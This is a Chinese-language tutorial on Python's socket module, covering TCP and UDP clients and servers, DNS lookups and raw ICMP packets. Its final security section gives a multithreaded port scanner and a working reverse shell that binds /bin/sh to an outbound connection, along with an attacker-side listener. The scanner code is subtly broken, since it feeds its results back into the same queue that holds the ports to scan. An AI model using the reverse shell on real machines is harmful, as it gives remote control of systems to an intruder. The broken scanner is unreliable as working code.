# socket 模块

> Python 标准库中的网络编程基础模块，提供底层网络套接字操作。

---

## 一、导入与基本概念

```python
import socket
```

**套接字类型：**
- `socket.AF_INET` - IPv4
- `socket.AF_INET6` - IPv6
- `socket.SOCK_STREAM` - TCP
- `socket.SOCK_DGRAM` - UDP

---

## 二、TCP 编程

### 2.1 TCP 客户端

```python
import socket

# 创建 TCP 套接字
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# 连接服务器
s.connect(('example.com', 80))

# 发送数据
request = b'GET / HTTP/1.0\r\nHost: example.com\r\n\r\n'
s.sendall(request)

# 接收数据
response = b''
while True:
    data = s.recv(4096)
    if not data:
        break
    response += data

print(response.decode())
s.close()
```

### 2.2 TCP 服务器

```python
import socket
import threading

def handle_client(conn, addr):
    """处理客户端连接"""
    print(f"[+] 新连接: {addr}")
    try:
        while True:
            data = conn.recv(1024)
            if not data:
                break
            print(f"[{addr[0]}] {data.decode().strip()}")
            conn.sendall(b'OK\n')
    finally:
        conn.close()
        print(f"[-] 断开连接: {addr}")

def tcp_server(host, port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # 地址重用（避免 TIME_WAIT 问题）
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    server.bind((host, port))
    server.listen(5)  # 最大等待连接数
    print(f"[*] 监听 {host}:{port}")
    
    while True:
        conn, addr = server.accept()
        # 多线程处理
        t = threading.Thread(target=handle_client, args=(conn, addr))
        t.start()

tcp_server('0.0.0.0', 8080)
```

### 2.3 常用方法

```python
# 设置超时
s.settimeout(5.0)  # 秒，None 表示无限等待

# 设置选项
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)

# 获取套接字信息
print(s.getsockname())    # 本地地址 (ip, port)
print(s.getpeername())    # 远端地址

# 阻塞/非阻塞模式
s.setblocking(False)  # 非阻塞模式

# 关闭
s.close()
s.shutdown(socket.SHUT_RDWR)  # 完全关闭
s.shutdown(socket.SHUT_RD)    # 关闭读
s.shutdown(socket.SHUT_WR)    # 关闭写
```

---

## 三、UDP 编程

### 3.1 UDP 客户端

```python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# 发送数据
s.sendto(b'Hello, UDP!', ('example.com', 12345))

# 接收数据
data, addr = s.recvfrom(1024)
print(f"收到 {addr}: {data.decode()}")

s.close()
```

### 3.2 UDP 服务器

```python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.bind(('0.0.0.0', 12345))
print("[*] UDP 服务器监听 12345")

while True:
    data, addr = s.recvfrom(1024)
    print(f"[{addr[0]}:{addr[1]}] {data.decode()}")
    # 回送数据
    s.sendto(b'Received: ' + data, addr)
```

---

## 四、其他常用功能

### 4.1 地址解析

```python
# 域名解析
ip = socket.gethostbyname('www.example.com')
print(ip)  # 93.184.216.34

# 完整信息
info = socket.gethostbyname_ex('www.google.com')
print(info)  # (hostname, aliases, ip_list)

# 反向解析（IP 转域名）
hostname = socket.gethostbyaddr('8.8.8.8')
print(hostname)

# 获取本机信息
print(socket.gethostname())
print(socket.getfqdn())  # 完全限定域名

# 服务端口查询
print(socket.getservbyname('http'))   # 80
print(socket.getservbyname('https'))  # 443
print(socket.getservbyname('ssh'))    # 22

# 端口号转服务名
print(socket.getservbyport(80))   # http
```

### 4.2 原始套接字

```python
import socket
import struct

# 创建原始套接字（需要管理员/root 权限）
# 协议号: IPPROTO_ICMP=1, IPPROTO_TCP=6, IPPROTO_UDP=17
s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)

# 构造 ICMP 包（Ping）
# 简化实现
def checksum(data):
    s = 0
    for i in range(0, len(data), 2):
        w = (data[i] << 8) + (data[i+1] if i+1 < len(data) else 0)
        s += w
    s = (s >> 16) + (s & 0xffff)
    s = ~s & 0xffff
    return s

icmp_type = 8  # Echo Request
icmp_code = 0
icmp_checksum = 0
icmp_id = 12345
icmp_seq = 1

header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
data = b'Hello, ICMP!'
icmp_checksum = checksum(header + data)
header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)

packet = header + data
s.sendto(packet, ('8.8.8.8', 0))
```

---

## 五、安全相关使用案例

### 5.1 端口扫描器

```python
import socket
import threading
from queue import Queue

def port_scan(target, port, result_queue):
    """扫描单个端口"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        result = s.connect_ex((target, port))
        if result == 0:
            # 尝试获取 banner
            try:
                s.send(b'HEAD / HTTP/1.0\r\n\r\n')
                banner = s.recv(1024).decode('utf-8', errors='ignore')
                result_queue.put((port, True, banner[:100]))
            except:
                result_queue.put((port, True, ''))
        else:
            result_queue.put((port, False, ''))
        s.close()
    except:
        result_queue.put((port, False, ''))

def scan_ports(target, start_port, end_port, threads=100):
    """多线程端口扫描"""
    queue = Queue()
    results = []
    
    def worker():
        while True:
            port = queue.get()
            if port is None:
                break
            port_scan(target, port, queue)
            queue.task_done()
    
    # 启动线程
    for _ in range(threads):
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()
    
    # 添加任务
    for port in range(start_port, end_port + 1):
        queue.put(port)
    
    queue.join()
    
    # 收集结果
    while not queue.empty():
        results.append(queue.get())
    
    return sorted([(p, b) for p, o, b in results if o])

# 使用
open_ports = scan_ports('127.0.0.1', 1, 1000, 50)
for port, banner in open_ports:
    print(f"  {port}/tcp  open  {banner[:50]}")
```

### 5.2 反向 Shell

```python
import socket
import subprocess
import os

def reverse_shell(host, port):
    """反向 Shell（仅用于授权安全测试）"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    
    # 重定向 stdin/stdout/stderr 到 socket
    os.dup2(s.fileno(), 0)   # stdin
    os.dup2(s.fileno(), 1)   # stdout
    os.dup2(s.fileno(), 2)   # stderr
    
    # 启动 shell
    subprocess.call(['/bin/sh', '-i'])

# 监听端（攻击者机器）
def listen_shell(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('0.0.0.0', port))
    s.listen(1)
    print(f"[*] 监听端口 {port}...")
    
    conn, addr = s.accept()
    print(f"[+] 收到连接: {addr}")
    
    # 简单交互
    while True:
        cmd = input("$ ")
        if cmd.lower() == 'exit':
            break
        conn.sendall(cmd.encode() + b'\n')
        response = conn.recv(4096)
        print(response.decode())
    
    conn.close()
    s.close()
```

---

## 六、常见错误码

| 异常 | 说明 |
|------|------|
| `ConnectionRefusedError` | 连接被拒绝（端口未开放） |
| `TimeoutError` | 连接超时 |
| `socket.gaierror` | 地址解析错误 |
| `ConnectionResetError` | 连接被重置 |
| `BrokenPipeError` | 管道破裂 |
| `PermissionError` | 权限不足（如原始套接字） |
